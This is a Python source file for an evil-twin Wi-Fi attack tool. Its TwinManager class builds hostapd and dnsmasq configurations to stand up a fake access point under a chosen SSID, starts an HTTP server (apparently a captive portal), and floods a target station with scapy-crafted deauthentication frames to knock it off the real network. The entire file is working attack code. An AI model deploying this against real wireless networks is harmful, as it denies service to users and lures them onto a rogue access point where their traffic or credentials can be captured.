import subprocess
import os
import time
import util
import sys
import threading
import scapy.all as scapy
import socket

class TwinManager:
    def __init__(self, ssid, nicm):
        self.ssid = ssid
        self.hostapd_proc = None
        self.dnsmasq_proc = None
        self.http_server_proc = None
        self.nicm = nicm
        self.twin_thread = None
        self.deauth_thread = None
        self.stop_event = threading.Event()
        self.socket = self.build_socket()

    def build_socket(self):
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
        s.bind((util.NIC_MON, 0))
        return s
        
    def cleanup(self):
        self.stop_deauth_attack()
        self.stop_fake_ap()
        if self.socket:
            self.socket.close()

    def build_ap_conf(self):
        with open(util.AP_CONF_TEMPLATE, "r") as f1, open(util.DNSMASQ_CONF_TEMPLATE, "r") as f2:
            ap_template = f1.read()
            ap_conf = (ap_template
                .replace("{{NIC}}", util.NIC_AP)
                .replace("{{SSID}}", self.ssid)
            )
            dnsmasq_template = f2.read()
            dnsmasq_conf = dnsmasq_template.replace("{{NIC}}", util.NIC_AP)
        with open(util.AP_CONF, "w") as f1, open(util.DNSMASQ_CONF, "w") as f2:
            f1.write(ap_conf)            
            f2.write(dnsmasq_conf)
 
    def _start_twin_activity(self):
        try:
            print("[*] Starting hostapd ...")
            self.hostapd_proc = subprocess.Popen(["sudo", "hostapd", util.AP_CONF],
                preexec_fn=os.setsid,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            time.sleep(1)
            print("[*] Setting up dnsmasq ...")
            self.dnsmasq_proc = subprocess.Popen(["dnsmasq", "--no-daemon", "-C", util.DNSMASQ_CONF],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            print("[*] Setting up the http server ...")
            self.http_server_proc = subprocess.Popen([sys.executable, "http/http_server.py"],
                # stdout=subprocess.DEVNULL,
                # stderr=subprocess.DEVNULL
            )
        except Exception as e:
            util.sp_error_handler(e)
        
    def start_fake_ap(self):
        self.twin_thread = threading.Thread(
            target=self._start_twin_activity()            
        )
        self.twin_thread.start()

    def stop_fake_ap(self):
        if self.hostapd_proc:
            print("hostapd process found! Killing it ...")
            self.hostapd_proc.terminate()
        if self.dnsmasq_proc:
            print("dnsmasq process found! Killing it ...")
            self.dnsmasq_proc.terminate()
        if self.http_server_proc:
            print("http server process found! Killing it ...")
            self.http_server_proc.terminate()
        if self.twin_thread:
            self.twin_thread.join()

    def stop_deauth_attack(self):
        self.stop_event.set()
        if self.deauth_thread:
            self.deauth_thread.join()
        
    def _disconnect_station(self, ap_mac, st_mac):
        deauth_pkt = scapy.RadioTap()/scapy.Dot11(addr1=st_mac, addr2=ap_mac, addr3=ap_mac)/scapy.Dot11Deauth(reason=7)
        while not self.stop_event.is_set():
            print("[*] Sending deauthentication frame!")
            self.socket.send(bytes(deauth_pkt))
            time.sleep(0.1)
        
    def start_deauth_attack(self, ap_mac, st_mac):
        self.deauth_thread = threading.Thread(
            target=self._disconnect_station,
            args=(ap_mac, st_mac)
        )
        self.deauth_thread.start()
        
